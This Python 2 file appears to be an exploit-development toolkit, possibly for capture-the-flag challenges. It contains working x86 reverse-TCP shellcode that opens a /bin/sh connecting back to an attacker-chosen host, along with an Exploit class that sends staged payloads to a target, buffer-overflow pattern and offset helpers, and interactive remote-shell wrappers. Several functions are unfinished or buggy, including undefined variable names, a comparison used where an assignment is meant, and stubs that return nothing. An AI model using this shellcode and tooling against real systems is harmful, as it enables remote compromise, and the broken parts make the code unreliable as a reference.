import re
import socket
import time
import sys
import telnetlib
from struct import pack,unpack
from string import ascii_lowercase as ALPHABET


class Exploit():
    def __init__(self, ip_addr, port, exploit_type):
        self.ip = ip_addr
        self.port = port
        self.type = exploit_type

        self.connectback = None
        self.bind = None

        self.stage = [] # list of input to send to get to arbitrary execution
        self.shellcode = None

    def connect_back(self, ip_addr, port):
        self.connectback = (ip_addr, port)

    def bind_shell(self, port):
        self.bind = port

    def prepare(self, input):
        self.stage.append(input)

    def generate(self, arch='x86'):
        if self.type == 'connectback':
            if self.connectback == None:
                raise RuntimeError("You haven't set parameters for the connect back")
            self.shellcode = reverse_tcp(self.connectback[0], self.connectback[1], arch)
        elif self.type == 'bind':
            if self.bind == None:
                raise RuntimeError("You haven't set parameters for the bind shell")
            self.shellcode = bind_shell(self.bind, arch) # needs implementation

    def display(self):
        for x in self.stage:
            sys.stdout.write(x)
        sys.stdout.write(repr(self.shellcode)[1:-1])

    def throw(self): # needs implementation
        connect = get_socket((self.ip, self.port)) 
        for send in self.stage:
            connect.send(send)
            time.sleep(.5)
            print sock.recv(0x10000)
        connect.send(self.shellcode)


def bind_shell(port, arch='x86'):
    '''
    Generate x86 bind shell shellcode (You connnect to the shell)
    
    Usage:
    reverse_tcp(ip_addr, port)
        ip_addr = connect back IP address as string
        port = connect back port as int

    A command you could use to setup a connection on your system is 'nc 127.0.0.1 7788'
    With 127.0.0.1 replaced with the ip of the target box. 
    '''

    if arch.lower() == 'x86':
        port = pack('>H', port)
        BIND_SHELL = BIND_SHELL_X86
    pass

def reverse_tcp(ip_addr, port, arch='x86'):
    '''
    Generate x86 reverse tcp shellcode (The shell connects to you)
    
    Usage:
    reverse_tcp(ip_addr, port)
        ip_addr = connect back IP address as string
        port = connect back port as int

    A command you could use to setup a listener on your system is 'nc -vl 7788'
    '''

    if arch.lower() == 'x86':
        ip = ''.join([chr(int(x)) for x in ip_addr.split('.')])
        port = pack('>H', port)

        REVERSE_TCP_X86 = (
            '\x31\xc0\x89\xc3\x50\x6a\x01\x6a\x02\x43\xb0\x66\x89\xe1\xcd\x80\x89\xc6'
            '\x31\xc0\xb0\x66\x43\x68' + ip + '\x66\x68' + port + '\x66\x53\x89\xe1'
            '\x6a\x10\x51\x56\x43\x89\xe1\xcd\x80\x89\xc7\x31\xc9\x89\xc8\x89\xca\xb1'
            '\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f'
            '\x62\x69\x6e\xb0\x0b\x89\xe3\x31\xc9\x89\xca\xcd\x80'
            )

        REVERSE_TCP = REVERSE_TCP_X86

    elif arch.lower() == 'x64':
        REVERSE_TCP = REVERSE_TCP_X64 # need implementation

    elif arch.lower() == 'arm':
        REVERSE_TCP == REVERSE_TCP_ARM # need implementation

    elif arch.lower() == 'mips':
        REVERSE_TCP = REVERSE_TCP_MIPS # need implementation

    banned = ('\x00', '\x0a', '\x0d')
    for x in banned:
        if x in REVERSE_TCP_X86:
            print 'This shellcode may not work because of {} at index {}'.format(repr(x), REVERSE_TCP.index(x))

    return REVERSE_TCP_X86


def get_socket(chal):
    '''chal is a 2-tuple with an address and a port  ex: ('127.0.0.1',111)'''
    s=socket.socket()
    s.settimeout(5)
    s.connect(chal)
    return s


def shell(sock):
    '''
    pass to this function a socket object with a 
    listening shell(socket reuse)
    '''
    command=''
    while(command != 'exit'):
        command=raw_input('$ ') 
        sock.send(command + '\n')#raw_input won't grab a newline
        time.sleep(.5)
        print sock.recv(0x10000)
    return


def lei(*nums):
    '''
    wrapper for struct.pack(), will guess integer size and type
    takes a variable number of arguments
    '''
    if(len(nums)==1):
        num=nums[0]
        if(num>0):
            if(num<0xffffffff):
                return pack("<I",num) # little-endian, unsigned int
            else:
                return pack("<Q",num) # little-endian, unsigned long long
        else:
            return pack("<i",num) # little-endian int
    else:
        return ''.join(map(lei,nums))


def chunk(iterable, chunk_size):
    '''Divide iterable into chunks of chunk_size'''
    for i in range(0, len(iterable), chunk_size):
        yield iterable[i:i+chunk_size]


def gen_pattern_string(): 
    '''Generator for pattern strings'''
    for x in ALPHABET: 
        for y in ALPHABET: 
            for z in range(10): 
                yield ''.join([x.upper(), y, str(z)])


def pattern_create(n): 
    '''Generate pattern string of n patterns (3 chars) long'''
    limit = 0 
    ret = ''
    for i in gen_pattern_string(): 
        if limit < n: 
            limit = limit + 1 
            ret = ret + i 
        else: 
            break 
    return ret 

MAX_PAT=''.join(gen_pattern_string())

def pattern_offset(offset):
    '''
    Search for offset in pattern string.
    Will accept an int of the form 0x12345678 or a 
    string that looks like '12345678'
    '''
    if(type(offset)==type(999)):
        offset=hex(offset)[2:].zfill(8)
    findMe=reduce(lambda a,b:b+a,chunk(offset,2)).decode('hex')
    return maxPat.index(findMe)



def telnet_shell(sock):
    '''pass to this function a socket object with a listening shell(socket reuse)'''
    tc = telnetlib.Telnet()  
    tc.sock = sock
    tc.interact() 
    return 
